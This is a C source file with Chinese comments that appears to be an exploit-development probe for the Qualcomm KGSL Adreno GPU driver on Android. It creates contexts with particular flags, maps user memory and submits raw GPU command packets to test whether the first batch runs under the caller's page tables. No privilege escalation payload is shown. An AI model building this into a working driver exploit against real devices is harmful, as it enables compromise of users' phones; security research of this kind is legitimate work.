/* kgsl_cheese_probe2.c — v2: 修正缓存顺序 + 首批次假说验证
 * 假说: 0x1812 ctx + MAP_USER_MEM(ADDR) + 0x4A flags=0 → 批次内含页表切换 preamble,
 *       首批次以我们的页表执行(无 fault); CPU 读出失败是 v1 的 civac 回写脏行覆盖所致。
 * 修正: 提交前先 cvac 清洗 out_buf(行干净), GPU 写 DRAM 后 civac 只作失效。
 */
#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include "adrenaline.h"

typedef struct { uint64_t gpuaddr, hostptr; uint32_t sizedwords, ctrl; } ibdesc_t;
typedef struct { uint32_t drawctxt_id, pad; uint64_t ibdesc_addr; uint32_t numibs, timestamp, flags, pad2; } issueib_t;

static uint64_t g_clsz;
static void cache_op(void *start, void *end, int inval) {
    start = (char*)((uintptr_t)start & ~(g_clsz - 1));
    for (; start < end; start += g_clsz) {
        if (inval) __asm volatile("dc civac, %0" : : "r" (start) : "memory");
        else       __asm volatile("dc cvac, %0"  : : "r" (start) : "memory");
    }
    __asm volatile("dsb ish" ::: "memory");
}

static int ctx_create(int fd, uint32_t *ctx) {
    struct kgsl_drawctxt_create req = { .flags = 0x00001812 };
    int r = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (r) return r;
    *ctx = req.drawctxt_id;
    return 0;
}

static int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = { .len = len, .offset = 0, .hostptr = addr, .memtype = KGSL_USER_MEM_TYPE_ADDR };
    int r = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (r) return r;
    *gpuaddr = req.gpuaddr;
    return 0;
}

static int gpu_command(int fd, uint32_t ctx_id, uint64_t ib_gpuaddr, uint32_t ib_size) {
    struct kgsl_command_object c;
    struct kgsl_gpu_command req;
    memset(&c, 0, sizeof(c));
    c.flags = KGSL_CMDLIST_IB;
    c.gpuaddr = ib_gpuaddr;
    c.size = ib_size;
    memset(&req, 0, sizeof(req));
    req.context_id = ctx_id;
    req.cmdsize = sizeof(c);
    req.numcmds = 1;
    req.cmdlist = (unsigned long)&c;
    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);
    printf("    GPU_COMMAND ret=%d%s ts=%u\n", err, err ? " (" : "", req.timestamp);
    if (err) printf("      errno=%d %s\n", errno, strerror(errno));
    return err;
}

static uint32_t *map_pages(size_t n, uint64_t *ga, int fd, const char *tag) {
    uint32_t *p = mmap(NULL, n * 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) { printf("mmap %s fail\n", tag); exit(1); }
    memset(p, 0, n * 0x1000);
    if (kgsl_map(fd, (unsigned long)p, n * 0x1000, ga)) { printf("map %s fail: %s\n", tag, strerror(errno)); exit(1); }
    printf("  %s: va=%p ga=0x%llx\n", tag, p, (unsigned long long)*ga);
    return p;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t ctr; asm("mrs\t%x0, ctr_el0" : "=r"(ctr));
    g_clsz = 4 << ((ctr >> 16) & 0xf);

    int fd = open("/dev/kgsl-3d0", O_RDWR | O_CLOEXEC);
    if (fd < 0) { printf("open fail\n"); return 1; }

    uint64_t ib_ga, out_ga;
    uint32_t *ib = map_pages(1, &ib_ga, fd, "ib");
    uint32_t *out = map_pages(1, &out_ga, fd, "out");

    /* ===== 实验 1: 新 context, 首批次 = CP_MEM_WRITE → out+0x100 ===== */
    printf("[1] 新 ctx 首批次 CP_MEM_WRITE out+0x100 = 0x11111111:\n");
    {
        uint32_t ctx;
        if (ctx_create(fd, &ctx)) { printf("  ctx fail %s\n", strerror(errno)); return 1; }
        printf("  ctx=%u\n", ctx);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
        *c++ = lower_32_bits(out_ga + 0x100);
        *c++ = upper_32_bits(out_ga + 0x100);
        *c++ = 0x11111111;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 0);            /* 清洗: DRAM=0, 行干净 */
        if (!gpu_command(fd, ctx, ib_ga, 16)) {
            sleep(1);
            cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);        /* 仅失效后读 */
            printf("  out[0x40] = 0x%08x %s\n", out[0x40], out[0x40] == 0x11111111 ? "<<< GPU 执行成功!!!" : "(未变)");
        }
        /* 同 context 第二批次(测试跳过优化假说) */
        c = ib;
        *c++ = cp_type7_packet(CP_MEM_WRITE, 3);
        *c++ = lower_32_bits(out_ga + 0x140);
        *c++ = upper_32_bits(out_ga + 0x140);
        *c++ = 0x22222222;
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        printf("[1b] 同 ctx 第二批次 out+0x140 = 0x22222222:\n");
        if (!gpu_command(fd, ctx, ib_ga, 16)) {
            sleep(1);
            cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
            printf("  out[0x50] = 0x%08x %s\n", out[0x50], out[0x50] == 0x22222222 ? "<<< GPU 执行成功!!!" : "(未变)");
        }
    }

    /* ===== 实验 2: 再新 context, 首批次 = MEM_TO_MEM ===== */
    printf("[2] 新 ctx 首批次 MEM_TO_MEM out+0x200 <- out+0x300(0xCAFEBABE):\n");
    {
        uint32_t ctx;
        if (ctx_create(fd, &ctx)) { printf("  ctx fail %s\n", strerror(errno)); return 1; }
        printf("  ctx=%u\n", ctx);
        out[0xC0] = 0xCAFEBABE;
        cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 0);
        uint32_t *c = ib;
        *c++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
        *c++ = 0;
        *c++ = lower_32_bits(out_ga + 0x200); *c++ = upper_32_bits(out_ga + 0x200);
        *c++ = lower_32_bits(out_ga + 0x300); *c++ = upper_32_bits(out_ga + 0x300);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        if (!gpu_command(fd, ctx, ib_ga, 24)) {
            sleep(1);
            cache_op((uint8_t*)out, (uint8_t*)out + 0x1000, 1);
            printf("  out[0x80] = 0x%08x %s\n", out[0x80], out[0x80] == 0xCAFEBABE ? "<<< GPU 执行成功!!!" : "(未变)");
        }
    }

    /* ===== 实验 3: 再新 context, 首批次 = 4x CP_NOP(若映射缺失应 hard fault) ===== */
    printf("[3] 新 ctx 首批次 4xCP_NOP(取指健康度判定):\n");
    {
        uint32_t ctx;
        if (ctx_create(fd, &ctx)) { printf("  ctx fail %s\n", strerror(errno)); return 1; }
        printf("  ctx=%u\n", ctx);
        uint32_t *c = ib;
        for (int i = 0; i < 4; i++) *c++ = cp_type7_packet(CP_NOP, 0);
        cache_op((uint8_t*)ib, (uint8_t*)ib + 0x1000, 0);
        gpu_command(fd, ctx, ib_ga, 16);
        sleep(1);
    }

    printf("done alive\n");
    return 0;
}
